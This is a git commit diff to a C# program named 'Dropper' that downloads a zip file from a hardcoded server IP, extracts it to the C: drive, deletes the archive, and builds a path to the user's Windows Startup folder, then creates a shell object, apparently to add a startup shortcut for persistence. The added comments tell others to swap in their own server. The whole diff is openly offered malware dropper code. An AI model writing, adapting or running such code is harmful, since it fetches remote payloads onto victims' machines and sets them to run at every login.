cb78a1752d4268f6014efd10023cdec6ee74f34a
Dylan Moore <hosnappp@gmail.com>
2017-04-28 00:38:31 -0400

    Update Program.cs

--- Dropper/Dropper/Program.cs
+++ Dropper/Dropper/Program.cs
@@ -11,8 +11,8 @@ namespace Dropper
 
             using (var client = new WebClient())
             {
-                client.DownloadFile("http://37.139.28.209/hi.zip", "hi.zip");
-            }
+                client.DownloadFile("http://37.139.28.209/hi.zip", "hi.zip"); //This is the IP for my private server on DigitalOcean
+            }                                                                 //remember to replace with yours.
             string user = Environment.UserName;
             string dir_ = "C:/Users/";
             string dir__ = "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
@@ -21,7 +21,7 @@ namespace Dropper
             string s = f + lnk_;
             ZipFile.ExtractToDirectory("hi.zip", "C:/");
             System.IO.File.Delete("hi.zip");
-            Type t = Type.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"));
+            Type t = Type.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8")); //this is the GUID for a shell process.
             dynamic shell = Activator.CreateInstance(t);
             try
             {
